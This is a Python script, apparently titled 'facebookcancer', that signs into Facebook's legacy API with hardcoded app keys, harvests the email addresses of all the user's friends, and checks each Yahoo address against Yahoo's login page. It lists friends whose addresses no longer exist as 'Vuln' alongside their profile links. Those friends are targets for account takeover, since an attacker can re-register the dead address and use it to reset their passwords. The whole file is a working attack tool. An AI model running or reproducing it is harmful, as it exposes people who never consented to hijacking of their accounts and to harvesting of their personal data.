#  virtualenv ../facebookcancer 
# source bin/activate
import requests
import hashlib
import sys
import time
import json
from bs4 import BeautifulSoup
import mechanize
import argparse

def generatefbtoken(id,password):
    pwd = password
    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
    data = {
        "api_key":"882a8490361da98702bf97a021ddc14d",
        "credentials_type":"password",
        "email":id,
        "format":"JSON", 
        "generate_machine_id":"1",
        "generate_session_cookies":"1",
        "locale":"en_US",
        "method":"auth.login",
        "password":pwd,
        "return_ssl_resources":"0",
        "v":"1.0"
        }
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
    x = hashlib.new('md5')
    x.update(sig.encode('utf-8'))
    # x.update(sig)
    data.update({'sig':x.hexdigest()})
    # return data
    r = requests.get('https://api.facebook.com/restserver.php',params=data)
    jsondata = r.json()
    # print(jsondata)
    try:
        token = jsondata["access_token"]
        return token 
    except Exception as err:
        print(jsondata["error_msg"])
        # sys.exit(err)
    # return token

def getemailfriendfb(token):
    arrayemail = []
    url = "https://graph.facebook.com/v3.2/me/friends/?fields=name,email&access_token="+token+"&limit=5000"
    r = requests.get(url)
    frindsobj = r.json()
    # print(frindsobj)
    datas = frindsobj["data"]
    print("Facebook total friend",frindsobj["summary"]["total_count"])
    print("Please wait. We are scanning the list of vuln users")

    return datas

def yahooemail(em,userid):

    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
    br._factory.is_html = True
    br.select_form(nr=0)
    br["username"] = (em)
    soup = BeautifulSoup(br.submit().read(), features="html.parser")
    status = soup.find_all("p")
    vuln = ("\033[31mNot Vuln")
    for p in status:
        try:
            if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
                vuln = ("\033[32mVuln")
                break
        except:
            pass
    len_email = (27-len(em))
    if (vuln == "\033[32mVuln"):
        len_vuln = (19-(len(vuln)-8))
        print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m| https://www.facebook.com/profile.php?id="+userid)
    # else:
    #     len_vuln = (19-(len(vuln)-8))
    #     print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', action='store',
                        dest='username',
                        help='Facebook username')

    parser.add_argument('-p', action='store',
                        dest='password',
                        help='Facebook password')

    results = parser.parse_args()
    # print('username     = {!r}'.format(results.username))
    # print('password   = {!r}'.format(results.password))

    if results.username is None:
        sys.exit("Please input facebook username. facebookcancer.py -h for more info")
    if results.password is None:
        sys.exit("Please input facebook password. facebookcancer.py -h for more info")
 
    token = generatefbtoken(results.username,results.password)
    print("Facebook Token: ", token)
    if token is None:
        sys.exit("INVALID TOKEN")
    data_list = getemailfriendfb(token)
    for data in data_list:
        # print(data)
        try:
            if '@yahoo' in data["email"]:
                # print(email)
                yahooemail(data["email"],data["id"])
        except Exception:
            pass
        #     # time.sleep(2)
            

    